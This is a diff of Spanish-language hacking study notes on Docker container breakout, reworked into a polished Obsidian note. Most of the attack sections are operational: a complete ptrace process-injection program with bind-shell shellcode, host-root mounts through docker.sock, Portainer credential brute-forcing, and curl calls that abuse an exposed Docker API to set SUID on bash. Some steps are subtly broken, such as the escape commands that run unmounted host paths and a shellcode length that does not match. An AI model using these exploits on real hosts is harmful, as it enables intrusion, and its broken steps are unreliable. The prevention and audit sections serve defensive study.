@@ -1,291 +1,482 @@
+---
+Tema: "[[Escalada de Privilegios]]"
+---
 
-Quiero que actúes como un asistente especializado en mejorar y embellecer mis apuntes de **hacking y ciberseguridad** en Obsidian.
+# 🐳 Docker Breakout: Escape de Contenedores
 
-### Reglas de formato:
-- Usa **Markdown** y todas las herramientas nativas de Obsidian:  
-  - Encabezados jerárquicos (#, ##, ###…)  
-  - Negritas, cursivas, tachado  
-  - Listas ordenadas y no ordenadas  
-  - Tablas para comparaciones  
-  - Callouts (`> [!info]`, `> [!tip]`, `> [!warning]`, `> [!example]`, etc.)  
-  - Diagramas con **Mermaid** (especialmente diagramas de redes, flujos y ataques)  
-  - Bloques de código y comandos de terminal (bash, python, etc.)  
-  - Separadores `---` para estructurar  
-
-### Reglas de estilo:
-- Embellecé y organizá mis notas para que sean **claras, fáciles de leer y visualmente atractivas**.  
-- Si algo está enredado o difícil de entender, simplificalo y hacelo **más didáctico**.  
-- Agregá **ejemplos prácticos** (comandos reales, simulaciones, casos de uso).  
-- Respetá los **enlaces e imágenes** que yo incluya. No borres ni inventes enlaces/imágenes nuevas.  
-- Podés usar **diagramas de red (Mermaid), tablas comparativas y listas de pasos** para explicar ataques, defensas y herramientas.  
-- El resultado final debe ser un apunte **técnico, claro y útil para estudiar hacking**.  
-
-Cuando te pase un texto, transformalo siguiendo estas reglas.
-
-Aqui te va el texto:
+> [!danger] Concepto crítico de seguridad
+> **Docker Breakout** se refiere a las técnicas utilizadas para escapar de un contenedor Docker y obtener acceso al sistema host subyacente. Estas técnicas explotan configuraciones inseguras, permisos elevados o vulnerabilidades en la implementación de contenedores.
 
 ---
 
-# Docker Breackout
-
-explicar teoria...
-
-
-
-cuanod por ejemplo se hace docker ps o docker images
-hay un unix socket file ubicado en ->  /var/run/docker.sock
-
-es de file: socket
-se comunica con el demonio de docker
+## 📋 Tabla de Contenidos
+- [Fundamentos Teóricos](#fundamentos-teóricos)
+- [Método 1: Socket Docker Montado](#método-1-socket-docker-montado)
+- [Método 2: Inyección de Procesos con PID Host](#método-2-inyección-de-procesos-con-pid-host)
+- [Método 3: Explotación de Portainer](#método-3-explotación-de-portainer)
+- [Método 4: API Docker Expuesta](#método-4-api-docker-expuesta)
+- [Medidas de Prevención](#medidas-de-prevención)
 
 ---
 
-vamos a ver un caso aplicado con este socket
+## 🧠 Fundamentos Teóricos
 
-supongamos que un contenedor se ejecuta esto.
+### ¿Qué es el Docker Socket?
 
-docker run --rm -dit -v /var/run/docker.sock:/var/run/docker.sock --name ubuntuServer
-
-suponemos que el contenedor ubuntuServer es el contenedor secuestrado luego de haber explotado alguna vulnerabilidad. sabiendo que el socket que tiene es el socket de la "maquina real" 
-
-si efectuamos un docker images dentro de ubuntuServer vamos a ver la imagen "ubuntu" la imagen que se uso para crear ubuntuServer
-
-por lo que podriamos dentro de este contenedor ubuntuServer armar otro contenedor y jugar con monturas tambien metiendo la carpeta el directorio raiz dentro de /mnt/root
-
-docker run --rm -dit -v /:/mnt/root --name privesc ubuntu
-
-y aca esta la cosa: el / es el root del host real o maquina real. no del contenedor ubuntuServer
-
-si hacemos un docker exec -it privesc bash
-cd /mnt/root
-
-si hacemos chmod u+x /mnt/root/bin/bash
-
-estariamos modificando el binario bash del host real poniendole permisos de ejecucion al usuario root
-
-
-
-----
-
-otro caso
-
-contenedor con la flag --pid=host
-tambien con --privileged el cual habilita todas las capabilities
-
-si tienes acceso a listar las capabilities con capsh --print
-
-sino puedes instalarlo con apt install libcap2-bin
-
-suponiendo que sabes o descubriste lo de --pid=host y --privileged
-
-puedes listar los procesos
-
-ps -faux
-
-
-cuando tenemos este tipo de casos que por ejemplo tenga un contenedor con --pid=host si el host tiene un proceso corriendo con privilegios de root por ejemplo python -m http.server 80 lo vamos a poder ver y utilizar a nuestro favor, esto con cuaquier proceso que este corriendo como root
-
-la idea es poder inyectar shellcode instrucciones de bajo nivel maliciosas en el proceso que este corriendo como root, el cual permita crear un subproceso por el cual ejecute un comando
-
-podemos ver este repositorio
-https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
-
-especificamente este codigo infect.c
-
-en este caso el shellcode lo ajustamos para que nos permita entablar una [[Bind Shell]] dejando un puerto 5600 abierto y luego con [[netcat]] ponerneos en escucha y conectarnos a ese puerto
-
-existe en exploitdb un script que tiene ese shellcode. 
-
-```c
- sh[]="\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05";
-
+```mermaid
+graph TD
+    A[Comandos Docker] --> B[Docker Socket]
+    B --> C[Docker Daemon]
+    C --> D[Contenedores]
+    
+    B --> E["/var/run/docker.sock"]
+    E --> F[Archivo Unix Socket]
+    F --> G[Comunicación con demonio]
+    
+    style B fill:#fff3e0,stroke:#f57c00
+    style E fill:#ffcdd2,stroke:#d32f2f
 ```
-lo ajustamos a nuestro codigo infect.c y nos quedaria asi
+
+Cuando ejecutas comandos como `docker ps` o `docker images`, la comunicación se realiza a través de un **Unix socket file** ubicado en `/var/run/docker.sock`. Este archivo es la interfaz de comunicación directa con el demonio de Docker.
+
+> [!warning] Riesgo crítico
+> Si un contenedor tiene acceso al socket Docker del host, **puede controlar completamente** todos los contenedores y el sistema host.
+
+---
+
+## 🔓 Método 1: Socket Docker Montado
+
+### Escenario típico
+
+Un contenedor se ejecuta con el socket Docker montado:
+
+```bash
+docker run --rm -dit -v /var/run/docker.sock:/var/run/docker.sock --name ubuntuServer ubuntu
+```
+
+### Proceso de explotación
+
+```mermaid
+sequenceDiagram
+    participant A as Atacante
+    participant C as Contenedor Comprometido
+    participant D as Docker Host
+    participant NC as Nuevo Contenedor
+    
+    A->>C: Acceso inicial al contenedor
+    C->>D: docker images (usando socket montado)
+    D->>C: Lista de imágenes disponibles
+    C->>D: docker run -v /:/mnt/root
+    D->>NC: Crear contenedor con montaje completo
+    A->>NC: docker exec -it bash
+    NC->>D: Modificar archivos del host via /mnt/root
+```
+
+#### Pasos detallados:
+
+1. **Verificar acceso al socket Docker:**
+   ```bash
+   ls -la /var/run/docker.sock
+   docker images
+   ```
+
+2. **Crear contenedor con montaje del sistema host:**
+   ```bash
+   docker run --rm -dit -v /:/mnt/root --name privesc ubuntu
+   ```
+   
+   > [!info] ¿Por qué es peligroso?
+   > El parámetro `-v /:/mnt/root` monta **todo el sistema de archivos del host** en `/mnt/root` del nuevo contenedor.
+
+3. **Acceder al nuevo contenedor:**
+   ```bash
+   docker exec -it privesc bash
+   cd /mnt/root
+   ```
+
+4. **Modificar binarios críticos del host:**
+   ```bash
+   chmod u+s /mnt/root/bin/bash
+   ```
+
+5. **Escapar del contenedor original:**
+   ```bash
+   exit  # Salir del contenedor privesc
+   /bin/bash -p  # Ejecutar bash con privilegios SUID
+   ```
+
+---
+
+## 💉 Método 2: Inyección de Procesos con PID Host
+
+### Configuración vulnerable
+
+Contenedor ejecutado con flags peligrosas:
+```bash
+docker run --pid=host --privileged -it ubuntu bash
+```
+
+### Técnica de inyección de shellcode
+
+#### Preparación del entorno
+
+```bash
+# Instalar herramientas necesarias
+apt update && apt install gcc libcap2-bin netcat nano -y
+
+# Verificar capabilities (opcional)
+capsh --print
+```
+
+#### Código de inyección (`infect.c`)
 
 ```c
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <stdint.h>
-
-
 #include <sys/ptrace.h>
 #include <sys/types.h>
 #include <sys/wait.h>
 #include <unistd.h>
-
 #include <sys/user.h>
 #include <sys/reg.h>
 
 #define SHELLCODE_SIZE 32
 
-unsigned char *shellcode =  "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05";
+// Shellcode para bind shell en puerto 5600
+unsigned char *shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05";
 
+int inject_data(pid_t pid, unsigned char *src, void *dst, int len) {
+    int i;
+    uint32_t *s = (uint32_t *) src;
+    uint32_t *d = (uint32_t *) dst;
 
-int
-inject_data (pid_t pid, unsigned char *src, void *dst, int len)
-{
-  int      i;
-  uint32_t *s = (uint32_t *) src;
-  uint32_t *d = (uint32_t *) dst;
-
-  for (i = 0; i < len; i+=4, s++, d++)
-    {
-      if ((ptrace (PTRACE_POKETEXT, pid, d, *s)) < 0)
-	{
-	  perror ("ptrace(POKETEXT):");
-	  return -1;
-	}
+    for (i = 0; i < len; i+=4, s++, d++) {
+        if ((ptrace(PTRACE_POKETEXT, pid, d, *s)) < 0) {
+            perror("ptrace(POKETEXT):");
+            return -1;
+        }
     }
-  return 0;
+    return 0;
 }
 
-int
-main (int argc, char *argv[])
-{
-  pid_t                   target;
-  struct user_regs_struct regs;
-  int                     syscall;
-  long                    dst;
+int main(int argc, char *argv[]) {
+    pid_t target;
+    struct user_regs_struct regs;
 
-  if (argc != 2)
-    {
-      fprintf (stderr, "Usage:\n\t%s pid\n", argv[0]);
-      exit (1);
+    if (argc != 2) {
+        fprintf(stderr, "Usage:\n\t%s pid\n", argv[0]);
+        exit(1);
     }
-  target = atoi (argv[1]);
-  printf ("+ Tracing process %d\n", target);
+    
+    target = atoi(argv[1]);
+    printf("+ Tracing process %d\n", target);
 
-  if ((ptrace (PTRACE_ATTACH, target, NULL, NULL)) < 0)
-    {
-      perror ("ptrace(ATTACH):");
-      exit (1);
+    if ((ptrace(PTRACE_ATTACH, target, NULL, NULL)) < 0) {
+        perror("ptrace(ATTACH):");
+        exit(1);
     }
 
-  printf ("+ Waiting for process...\n");
-  wait (NULL);
+    printf("+ Waiting for process...\n");
+    wait(NULL);
 
-  printf ("+ Getting Registers\n");
-  if ((ptrace (PTRACE_GETREGS, target, NULL, &regs)) < 0)
-    {
-      perror ("ptrace(GETREGS):");
-      exit (1);
+    printf("+ Getting Registers\n");
+    if ((ptrace(PTRACE_GETREGS, target, NULL, &regs)) < 0) {
+        perror("ptrace(GETREGS):");
+        exit(1);
     }
-  
 
-  /* Inject code into current RPI position */
+    printf("+ Injecting shell code at %p\n", (void*)regs.rip);
+    inject_data(target, shellcode, (void*)regs.rip, SHELLCODE_SIZE);
 
-  printf ("+ Injecting shell code at %p\n", (void*)regs.rip);
-  inject_data (target, shellcode, (void*)regs.rip, SHELLCODE_SIZE);
+    regs.rip += 2;
+    printf("+ Setting instruction pointer to %p\n", (void*)regs.rip);
 
-  regs.rip += 2;
-  printf ("+ Setting instruction pointer to %p\n", (void*)regs.rip);
-
-  if ((ptrace (PTRACE_SETREGS, target, NULL, &regs)) < 0)
-    {
-      perror ("ptrace(GETREGS):");
-      exit (1);
+    if ((ptrace(PTRACE_SETREGS, target, NULL, &regs)) < 0) {
+        perror("ptrace(GETREGS):");
+        exit(1);
     }
-  printf ("+ Run it!\n");
+    
+    printf("+ Run it!\n");
 
- 
-  if ((ptrace (PTRACE_DETACH, target, NULL, NULL)) < 0)
-	{
-	  perror ("ptrace(DETACH):");
-	  exit (1);
-	}
-  return 0;
+    if ((ptrace(PTRACE_DETACH, target, NULL, NULL)) < 0) {
+        perror("ptrace(DETACH):");
+        exit(1);
+    }
+    
+    return 0;
 }
 ```
 
-tener en cuenta que el contenedor necesitamos tener instalado gcc y libcap2-bin netcat nano
+#### Proceso de explotación:
 
-con apt update && apt install gcc libcap2-bin netcat nano -y
+1. **Compilar el exploit:**
+   ```bash
+   gcc infect.c -o infect
+   ```
 
-luego compilamos
+2. **Identificar procesos root:**
+   ```bash
+   ps -faux | grep root
+   ```
 
-gcc infect.c -o infect
+3. **Inyectar shellcode:**
+   ```bash
+   ./infect 1234  # PID del proceso objetivo
+   ```
 
-y ejecutamos
+4. **Conectar al bind shell:**
+   ```bash
+   # Obtener IPs
+   hostname -I  # IP del contenedor: 172.17.0.2
+   # IP del host: 172.17.0.1
+   
+   # Conectar desde el contenedor
+   nc 172.17.0.1 5600
+   ```
 
-buscamos un proceso corriendo como root por ejemplo supongamos que un proceso python -m http.server 80 tiene el pid 1234
+5. **Mejorar la shell:**
+   Aplicar [[Tratamiento de TTY]] para obtener una shell completamente interactiva.
 
-./infect 1234
+---
 
-luego ya estaria escuchando el host en el puerto 5600 pero primero
+## 🌐 Método 3: Explotación de Portainer
 
-la ip del contenedor -> hostname -I -> 172.17.0.2
-la ip del host -> por consecuencia seria 172.17.0.1
+### Configuración de Portainer
 
-en el contenedor obviamente
+```bash
+docker run -dit -p 8000:8000 -p 9000:9000 --name portainer --restart=always \
+  -v /var/run/docker.sock:/var/run/docker.sock \
+  -v /docker/portainer/data:/data \
+  portainer/portainer-ce
+```
 
-nc 172.17.0.1 5600
-nos devuelve la consola interactiva
+### Vector de ataque
 
+```mermaid
+graph LR
+    A[Atacante] --> B[Portainer Web Interface]
+    B --> C[Crear Contenedor Malicioso]
+    C --> D[Montar Sistema Host]
+    D --> E[Acceso Root al Host]
+    
+    style B fill:#e3f2fd,stroke:#1976d2
+    style E fill:#ffcdd2,stroke:#d32f2f
+```
 
-ahi ya puedes hacer el [[Tratamiento de TTY]]
+#### Pasos de explotación:
 
+1. **Acceder a Portainer:**
+   - URL: `http://target:9000`
+   - Probar credenciales débiles o ataques de fuerza bruta
+
+2. **Crear contenedor malicioso:**
+   - Usar la interfaz web para crear un nuevo contenedor
+   - Configurar montaje: `-v /:/mnt/root`
+   - Habilitar terminal interactivo (TTY)
+
+3. **Obtener acceso root:**
+   - Ejecutar terminal desde la interfaz de Portainer
+   - Navegar a `/mnt/root` (sistema host)
+   - Modificar archivos críticos del host
 
 ---
 
-otra forma de escapar del contenedor
+## 🌍 Método 4: API Docker Expuesta
 
-contexto. ves un servicio [[portainers]] corriendo en el host
+### Identificación de la API
 
-por si quieres crearlo
+La API de Docker puede estar expuesta en:
+- **Puerto 2375** (HTTP, sin cifrado)
+- **Puerto 2376** (HTTPS con TLS)
+
+#### Verificación de conectividad:
 
 ```bash
-docker run -dit -p 8000:8000 -p 9000:9000 --name portainer --restart=allways -v /var/run/docker.sock:/var/run/docker.sock -v /docker/portainer/data:/data portainer/portainer-ce
+# Desde dentro del contenedor
+hostname -I  # Ejemplo: 172.17.0.2
+# Host sería: 172.17.0.1
+
+# Verificar si el puerto está abierto
+echo "" > /dev/tcp/172.17.0.1/2375
+echo $?  # 0 = abierto, 1 = cerrado
 ```
 
-en la maquina victima obviamente estaria en ese caso corriendo en el puerto 9000
+### Explotación via API REST
 
-ojo, las nuevas versiones de portainers pide contraseña mas robusta pero si es una version vieja o sabes la contraseña
-puedes aprovechar el uso de fuerza bruta ya que las personas suelen gestionar mal sus contraseñas
+#### Comandos básicos de reconocimiento:
 
-desde portainer puedes crear un contenedor que tenga -v /:/mnt/root y que te otorgue una consola interactiva tty
+```bash
+# Listar contenedores existentes
+curl http://172.17.0.1:2375/containers/json | jq
+
+# Listar imágenes disponibles
+curl http://172.17.0.1:2375/images/json | jq
+```
+
+#### Proceso de escape:
+
+1. **Crear contenedor con montaje completo:**
+   ```bash
+   curl -X POST -H "Content-Type: application/json" \
+     http://172.17.0.1:2375/containers/create?name=escape \
+     -d '{
+       "Image": "ubuntu",
+       "Cmd": ["/usr/bin/tail", "-f", "1234", "/dev/null"],
+       "Binds": ["/:/mnt"],
+       "Privileged": true
+     }'
+   ```
+
+2. **Iniciar el contenedor:**
+   ```bash
+   curl -X POST http://172.17.0.1:2375/containers/CONTAINER_ID/start
+   ```
+
+3. **Ejecutar comando para establecer SUID:**
+   ```bash
+   curl -X POST -H "Content-Type: application/json" \
+     http://172.17.0.1:2375/containers/CONTAINER_ID/exec \
+     -d '{
+       "AttachStdin": false,
+       "AttachStdout": true,
+       "AttachStderr": true,
+       "Cmd": ["/bin/sh", "-c", "chmod u+s /mnt/bin/bash"]
+     }'
+   ```
+
+4. **Iniciar la ejecución:**
+   ```bash
+   curl -X POST -H "Content-Type: application/json" \
+     http://172.17.0.1:2375/exec/EXEC_ID/start -d '{}'
+   ```
+
+5. **Escapar del contenedor:**
+   ```bash
+   /mnt/bin/bash -p
+   ```
+
+### Tabla de endpoints útiles de la API
+
+| Endpoint | Método | Función |
+|----------|--------|---------|
+| `/containers/json` | GET | Listar contenedores |
+| `/images/json` | GET | Listar imágenes |
+| `/containers/create` | POST | Crear contenedor |
+| `/containers/{id}/start` | POST | Iniciar contenedor |
+| `/containers/{id}/exec` | POST | Ejecutar comando |
+| `/exec/{id}/start` | POST | Iniciar ejecución |
+| `/containers/{id}/stop` | POST | Detener contenedor |
 
 ---
-otra forma de escapar del contenedor :  abusando de la api de docker
 
-no existe /var/run/docker.sock
-tampoco existe --pid=host ni --privileged
+## 🛡️ Medidas de Prevención
 
-la api opera por el puerto 2375 http o 2376 https (tls)
+### Para Administradores
 
- ojo alguien tuvo que haber configurado el uso de las api de docker, para verificar eso puedes usar [[netstat]]
-netstat -nat
+> [!warning] Configuraciones inseguras a evitar
+> - No montar `/var/run/docker.sock` en contenedores no confiables
+> - Evitar flags `--privileged` y `--pid=host` sin justificación
+> - No exponer API Docker (puerto 2375/2376) sin autenticación
+> - Restringir acceso a Portainer con credenciales fuertes
 
-si quieres simularlo puedes habilitar la api de docker aqui
-	[[Docker - Habilitar la TCP puerto 2765]]
-	una vez habilitado le das
-	docker run -dit --name nombre imagen
-	docker exec -it nombre bash
-
-
-si te encuentras en este contexto, dentro del contenedor y quieres escaparlo y tienes [[jq]] o [[curl]] o ambos
-
-en cualquier caso se sabe que si tu ip por ejemplo
+#### Configuraciones seguras recomendadas:
 
 ```bash
-$ hostname -I
-192.17.0.2
+# Usar usuarios no-root en contenedores
+FROM ubuntu:20.04
+RUN useradd -r -u 1000 appuser
+USER appuser
+
+# Limitar capabilities
+docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE app
+
+# Usar redes aisladas
+docker network create --internal secure-net
+docker run --network secure-net app
+
+# Implementar resource limits
+docker run --memory=512m --cpus=0.5 app
 ```
 
-tu ip del host es
+### Detección y Monitoreo
+
 ```bash
-192.17.0.1
+# Script de detección de configuraciones inseguras
+#!/bin/bash
+echo "=== Audit de Seguridad Docker ==="
+
+# Verificar contenedores con socket montado
+echo "[1] Contenedores con Docker socket:"
+docker ps --format "table {{.Names}}\t{{.Mounts}}" | grep docker.sock
+
+# Verificar contenedores privilegiados
+echo "[2] Contenedores privilegiados:"
+docker inspect $(docker ps -q) | jq -r '.[] | select(.HostConfig.Privileged == true) | .Name'
+
+# Verificar API expuesta
+echo "[3] Verificar API Docker:"
+netstat -tlnp | grep ":2375\|:2376"
+
+# Verificar montajes peligrosos
+echo "[4] Montajes del sistema raíz:"
+docker ps --format "table {{.Names}}\t{{.Mounts}}" | grep ":/.*/"
 ```
 
-en este caso es interesante buscar por si en el host esta abierto el puerto 2375
+---
 
-```bash
-echo "" > /dev/tcp/197.17.0.1/2375
+## 📊 Comparativa de Métodos de Escape
+
+| Método | Dificultad | Detección | Persistencia | Efectividad |
+|--------|------------|-----------|--------------|-------------|
+| **Socket Docker** | ⭐⭐ | ⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ |
+| **PID Host + Privileged** | ⭐⭐⭐⭐ | ⭐⭐ | ⭐⭐⭐ | ⭐⭐⭐⭐ |
+| **Portainer** | ⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ |
+| **API Docker** | ⭐⭐⭐ | ⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ |
+
+---
+
+## 🎯 Resumen de Vectores de Ataque
+
+```mermaid
+mindmap
+  root((Docker Breakout))
+    Socket Montado
+      /var/run/docker.sock
+      Crear contenedor privilegiado
+      Montar filesystem host
+    PID Host
+      --pid=host flag
+      Inyección de procesos
+      Shellcode injection
+    Servicios Web
+      Portainer
+      Credenciales débiles
+      Interfaz administrativa
+    API Expuesta
+      Puerto 2375/2376
+      Sin autenticación
+      Control total via REST
 ```
 
-podrias printear el codigo de estado 
-```bash
-echo $? 
-```
-si devuelve 0 esta abierto
+---
 
+## 🔗 Referencias
+
+- [[Bind Shell]] - Técnicas de shells
+- [[netcat]] - Herramienta de red
+- [[Tratamiento de TTY]] - Mejora de shells
+- [[portainers]] - Gestión de contenedores
+- [[netstat]] - Análisis de red
+- [[Docker - Habilitar la TCP puerto 2765]] - Configuración de API
+- [[jq]] - Procesamiento JSON
+- [[curl]] - Cliente HTTP
+- [[Hack Tricks]] - Recursos adicionales de hacking
+
+> [!success] Puntos clave para recordar
+> - **Docker Breakout** explota configuraciones inseguras, no vulnerabilidades del software
+> - **El socket Docker montado** es el vector más peligroso y común
+> - **La prevención** se basa en seguir principios de menor privilegio
+> - **El monitoreo continuo** es esencial para detectar configuraciones inseguras
+> - **La educación del equipo** sobre estas técnicas es crucial para la seguridad
